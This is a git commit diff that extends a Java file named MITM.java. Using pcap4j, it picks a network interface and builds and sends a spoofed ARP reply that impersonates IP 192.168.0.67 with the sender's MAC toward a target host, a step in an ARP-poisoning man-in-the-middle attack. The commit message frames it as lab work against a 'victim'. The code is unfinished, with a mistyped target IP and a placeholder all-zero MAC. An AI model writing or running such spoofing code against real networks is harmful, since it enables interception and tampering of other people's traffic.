04f73c0f77695bae81ecd72bb770a5e4b1651c3a
Clowntech0 <clowntech3@gmail.com>
2026-03-18 18:28:27 -0400

    Add Arp Request Template from pcap4j
    Working along side the example to create an arp packet.
    
    Need to add a way to first get the lab victims mac address through arp before sending spoofed arp packets

--- src/MITM.java
+++ src/MITM.java
@@ -1,22 +1,112 @@
-import org.pcap4j.core.PcapNativeException;
-import org.pcap4j.core.PcapNetworkInterface;
-import org.pcap4j.core.Pcaps;
+import org.pcap4j.core.*;
+import org.pcap4j.packet.ArpPacket;
+import org.pcap4j.packet.EthernetPacket;
+import org.pcap4j.packet.Packet;
+import org.pcap4j.packet.namednumber.ArpHardwareType;
+import org.pcap4j.packet.namednumber.ArpOperation;
+import org.pcap4j.packet.namednumber.EtherType;
+import org.pcap4j.util.ByteArrays;
+import org.pcap4j.util.MacAddress;
+import org.pcap4j.util.NifSelector;
 
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class MITM{
-    public static void main(String[] args) throws PcapNativeException, IOException {
+
+    public static void main(String[] args) throws PcapNativeException, IOException, NotOpenException {
+        //temporary fix to force pcap4j to use Npcap instead of wpcap
         System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");
+
+        String[] s = new String[1];
+        s[0] = "192.168.0.104";
+
+        //SendArpRequestTemplate.run(s);
+
+
+
+        PcapNetworkInterface networkInterface = null;
 
         List<PcapNetworkInterface> networkInterfaces = Pcaps.findAllDevs();
 
+        //Find the first available interface with a valid ipv4 address
         for (PcapNetworkInterface nInterface : networkInterfaces){
-            System.out.println(nInterface.getName() + " : " + nInterface.getAddresses());
+            for(PcapAddress address : nInterface.getAddresses()){
+
+                //find our ipv4 address
+                if(address instanceof PcapIpV4Address){
+
+                    //we dont want our loopback address
+                    if(address.getAddress().isLoopbackAddress()){
+                        continue;
+                    }
+
+                    System.out.println("IP4 Address found:");
+                    System.out.println(address.getAddress().getHostAddress());
+
+                    networkInterface = nInterface;
+                }
+            }
         }
-        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
-        in.readLine();
+
+        if (networkInterface == null) {
+            System.exit(1);
+        }
+
+        System.out.println(networkInterface.toString());
+
+        //built based off sendarprequest sample https://github.com/kaitoy/pcap4j/blob/v1/pcap4j-sample/src/main/java/org/pcap4j/sample/SendArpRequest.java
+
+        String targetIP = "192.160.0.104";
+        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();
+
+
+        PcapHandle handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
+        ExecutorService pool = Executors.newSingleThreadExecutor();
+
+        //Attackers Mac Address
+        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
+        //TODO: we only want to target one device. do we do broadcast MAC?
+        MacAddress destinationMac = MacAddress.getByName("00:00:00:00:00:00");
+
+        //Impersonated IP
+        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
+        //targeted IP
+        InetAddress destinationIP = InetAddress.getByName(targetIP);
+
+        ArpPacket.Builder arpPacket = new ArpPacket.Builder();
+
+        arpPacket
+                .hardwareType(ArpHardwareType.ETHERNET)
+                .protocolType(EtherType.IPV4)
+                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
+                .protocolAddrLength((byte) sourceIP.getAddress().length)
+                .operation(ArpOperation.REPLY)
+                .srcHardwareAddr(sourceMac)
+                .srcProtocolAddr(sourceIP)
+                .dstHardwareAddr(destinationMac)
+                .dstProtocolAddr(destinationIP);
+
+        EthernetPacket.Builder header = new EthernetPacket.Builder();
+
+        header
+                .dstAddr(destinationMac)
+                .srcAddr(sourceMac)
+                .type(EtherType.ARP)
+                .payloadBuilder(arpPacket)
+                .paddingAtBuild(true);
+
+        Packet spoofedPacket = header.build();
+
+        handle.sendPacket(spoofedPacket);
+        handle.close();
     }
 }
